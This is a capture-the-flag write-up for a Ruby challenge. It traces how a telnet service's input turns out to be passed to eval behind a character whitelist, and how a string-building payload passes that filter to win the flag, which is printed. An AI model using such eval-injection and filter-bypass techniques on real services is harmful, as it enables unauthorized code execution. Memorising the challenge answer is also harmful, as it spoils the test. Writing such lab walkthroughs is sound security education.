# Talk to me
Points: 100  
Bonus (first team to solve): 10  
Topics: ruby  

> An Advicefull Aunt
> Ever since you were a child, your aunt Matilda has nudged you to becoming a hacker like her. The happiest you’ve ever seen a person is when you were 18 and she walked in on you disassembling the VCR. She loved you and had big dreams for you. You didn’t know exactly what she did for a living, but about five months ago she completely disappeared without a word.
> 
> Today is your 20th birthday, and you’re hanging out in your apartment with your roommate, Sam. It’s been a pretty regular morning up until this point except all the electronics in your apartment are on the fritz. Your WiFi enabled toothbrush has been whirling like crazy. Your smart alarm clock keeps beeping and booping. You seriously re-evaluate the merits of your IoT bidet. Everything is a mess.
> 
> “Hey, Sam, did you change anything with the WiFi?”
> “No… oh wait. I found this free ‘Gromecast’ in the parking lot and set it up. It gets free HBO!”
> 
> You walk over to the TV and see a 3D printed Raspberry PI enclosure with a cable going to the TV and another to the router. The enclosure has “Gromecast” and “Free HBO” scrawled on the top in sharpie. You’re going to need to have a talk with Sam after you get this sorted out.
> 
> A quick scan of the port of the device reveal its running a [server](telnet://talk-to-me-dd00922915bfc3f1.squarectf.com:5678).


The server link is using the telnet protocol, something our browser does
not natively speak. So instead we will be using a simple Python client and
the built-in telnetlib to communicate with the server.

Just connecting to the server we get a simple hello message: `b'Hello!\n'`,
and then the connection is closed. So we try to send something back:

```
-> b'Hello!\n'
<- b"Hello!\nSorry, I can't understand you.\n"
[connection closed]

-> b'abc\n'
<- b"Hello!\nSorry, I can't understand you.\n"
[connection closed]
```

Every message seems to result in the same "Sorry, I can't understand you."
reply. However, sending an empty message we get another answer:

```
-> b'\n'
<- b'Hello!\nI wish you would greet me the way I greeted you.\n'
```

It's not very helpful though, as we have already tried sending a "Hello!"
message and that just resulted in the server not understanding us. Instead,
after trying some other more or less random messages, we stumble upon a
much more interesting reply:

```
-> b'0\n'
<- b"Hello!\nundefined method `match' for 0:Integer\n/talk_to_me.rb:16:in `receive_data'\n/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run_machine'\n/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run'\n/talk_to_me.rb:31:in `<main>'\n"
```

Or better formatted it reads like this:

```
undefined method `match' for 0:Integer
/talk_to_me.rb:16:in `receive_data'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run_machine'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run'
/talk_to_me.rb:31:in `<main>'
```

Somehow it seems like our message has been turned into an `Integer`. After
some more testing (such as sending a `"1+1\n"` message and seeing that it
actually says 2 in the error) it seems like the message is not just turned
into an Integer, but it is actually run through `eval`. This is easier to
see in the error message we get back when sending a message representing a
proc:

```
-> b'->{}\n'
<- Hello!
undefined method `match' for #<Proc:0x000055d26adba9b0@(eval):1 (lambda)>
/talk_to_me.rb:16:in `receive_data'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run_machine'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run'
/talk_to_me.rb:31:in `<main>'
```

Compare the above `#<Proc:0x000055d26adba9b0@(eval):1 (lambda)>`
representation to what is returned when running eval in a ruby interpreter
locally:

```ruby
eval("->{}")
=> #<Proc:0x000055aeca93a188@(eval):1 (lambda)>
```

Looks pretty similar to me! :)

As such we might guess that the server implementation looks (simplified)
something like this:

```ruby
def receive_data(msg)
    eval(msg).match(...)
end
```

There is still one piece missing though, and that's the "Sorry, I can't
understand you." message we got when sending normal messages previously.
It turns out that this error is received as soon as the message contains
anything but some whitelisted characters. This can be seen from the below
"conversation" where the stack-trace response is replaced by the sorry
message as soon as an 'a' is added to the sent message.


```
-> b"'1'-0\n"
<- Hello!
undefined method `-' for "1":String
Did you mean?  -@
/talk_to_me.rb:16:in `eval'
/talk_to_me.rb:16:in `eval'
/talk_to_me.rb:16:in `receive_data'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run_machine'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run'
/talk_to_me.rb:31:in `<main>'

-> b'\'11234567890.,-+/;:{}><%"\'-0\n'
<- Hello!
undefined method `-' for "11234567890.,-+/;:{}><%\"":String
Did you mean?  -@
/talk_to_me.rb:16:in `eval'
/talk_to_me.rb:16:in `eval'
/talk_to_me.rb:16:in `receive_data'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run_machine'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run'
/talk_to_me.rb:31:in `<main>'

-> b"'1a'-0\n"
<- Hello!
Sorry, I can't understand you.
```

Luckily for us the whitelist is permissive enough for us to construct
the string `"Hello!"` by other means, and we are awarded with the flag:

```
-> b"''<<72<<101<<108<<108<<111<<33\n"
<- Hello!
It's so great to talk to you! Maybe you know what to do with this flag-2b8f1139b0726726?
```

(The above ruby magic simply evaluates to the string "Hello!", as can be
seen in our ruby interpreter)
```ruby
''<<72<<101<<108<<108<<111<<33
=> "Hello!"
```
